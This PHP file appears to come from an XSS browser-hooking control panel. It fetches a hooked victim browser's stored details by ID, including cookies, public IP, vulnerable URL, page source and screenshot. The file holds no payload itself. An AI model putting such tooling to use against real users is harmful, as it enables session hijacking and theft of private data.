<?php
    require_once __DIR__ . '/database.php';
    connectToDatabase();
    
   /*   Retrieve hook brower details from browserId
    *   $browserID = the id browser generated in hook.js
    */
    function getHookedBrowserDetails($browserId) {
        if(isset($browserId) && !empty($browserId)) {
            if(!($stmt = $GLOBALS['___mysqli_ston']->prepare("SELECT last_heartbeat, browser_id, user_agent, hostname, public_ip, hooked_date, vulnerable_url, origin, referer, cookies, source_code, hooked_screenshot FROM hooked_browsers WHERE browser_id = ?"))) {
                return;
            }

            if (!$stmt->bind_param("s", $browserId)) {
                return;
            }
            
            if(!$stmt->execute()) {
                return;
            }

            $outLastHeartbeat = NULL;
            $outBrowserId = NULL;
            $outUserAgent = NULL;
            $outHostname = NULL;
            $outPublicIP = NULL;
            $outHookedDate = NULL;
            $outVulnerableURL = NULL;
            $outOrigin = NULL;
            $outReferer = NULL;
            $outCookies = NULL;
            $outSourceCode = NULL;
            $outHookedScreenshot = NULL;
            $hookedBrowserDetails = array();

            $stmt->store_result();
            $stmt->bind_result($outLastHeartbeat, $outBrowserId, $outUserAgent, $outHostname, $outPublicIP, $outHookedDate, $outVulnerableURL, $outOrigin, $outReferer, $outCookies, $outSourceCode, $outHookedScreenshot);
            while ($stmt->fetch()) {
                $hookedBrowserDetails = array('lastHeatbeat'=>$outLastHeartbeat, 'browserId'=>$outBrowserId, 'userAgent'=>$outUserAgent, 'hostname'=>$outHostname, 'publicIP'=>$outPublicIP, 'hookedDate'=>$outHookedDate, 'vulnerableURL'=>$outVulnerableURL, 'origin'=>$outOrigin, 'referer'=>$outReferer, 'cookies'=>$outCookies, 'sourceCode'=>$outSourceCode, 'hookedScreenshot'=>$outHookedScreenshot);
            }

            $stmt->free_result();
            $stmt->close(); 

            return $hookedBrowserDetails;  
        }       
    }    
?>